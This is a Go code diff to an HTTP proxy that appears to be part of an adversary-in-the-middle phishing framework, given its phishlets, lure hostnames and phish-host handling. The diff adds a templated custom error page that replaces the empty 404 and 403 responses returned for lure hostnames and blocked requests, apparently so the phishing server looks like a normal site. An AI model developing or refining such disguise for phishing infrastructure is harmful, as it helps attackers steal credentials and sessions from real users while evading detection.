@@ -93,6 +93,7 @@ type HttpProxy struct {
 	ip_whitelist      map[string]int64
 	ip_sids           map[string]string
 	auto_filter_mimes []string
+	errorPageHtml     string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
 }
@@ -159,6 +160,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		// Assuming Viper is used, we can try to set it.
 		// Since we don't have direct access to save yet, we rely on runtime config persistence or manual update.
 		log.Info("Generated new session cookie name: %s", p.cookieName)
+	}
+
+	// Load custom error page
+	if epData, err := ioutil.ReadFile("web/error.html"); err == nil {
+		p.errorPageHtml = string(epData)
+		log.Info("Loaded custom error page from web/error.html")
+	} else {
+		p.errorPageHtml = ""
 	}
 
 	p.Server = &http.Server{
@@ -787,11 +796,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// check if lure hostname was triggered - by now all of the lure hostname handling should be done, so we can bail out
 				if p.cfg.IsLureHostnameValid(req.Host) {
 					log.Debug("lure hostname detected - returning 404 for request: %s", req_url)
-
-					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
-					if resp != nil {
-						return req, resp
-					}
+					return p.renderErrorPage(req, http.StatusNotFound, "Page Not Found", "The page you are looking for might have been removed, had its name changed, or is temporarily unavailable.")
 				}
 
 				// replace "Host" header
@@ -1587,6 +1592,24 @@ func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 	return "", false
 }
 
+func (p *HttpProxy) renderErrorPage(req *http.Request, statusCode int, title string, message string) (*http.Request, *http.Response) {
+	if p.errorPageHtml == "" {
+		resp := goproxy.NewResponse(req, "text/html", statusCode, "")
+		if resp != nil {
+			return req, resp
+		}
+		return req, nil
+	}
+	body := strings.Replace(p.errorPageHtml, "{error_code}", fmt.Sprintf("%d", statusCode), 1)
+	body = strings.Replace(body, "{error_title}", html.EscapeString(title), 1)
+	body = strings.Replace(body, "{error_message}", html.EscapeString(message), 1)
+	resp := goproxy.NewResponse(req, "text/html", statusCode, body)
+	if resp != nil {
+		return req, resp
+	}
+	return req, nil
+}
+
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
 	var redirect_url string
 	if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
@@ -1599,10 +1622,7 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 	if redirect_url != "" {
 		return p.javascriptRedirect(req, redirect_url)
 	} else {
-		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
-		if resp != nil {
-			return req, resp
-		}
+		return p.renderErrorPage(req, http.StatusForbidden, "Access Denied", "Your request could not be processed. This resource requires proper authorization.")
 	}
 	return req, nil
 }
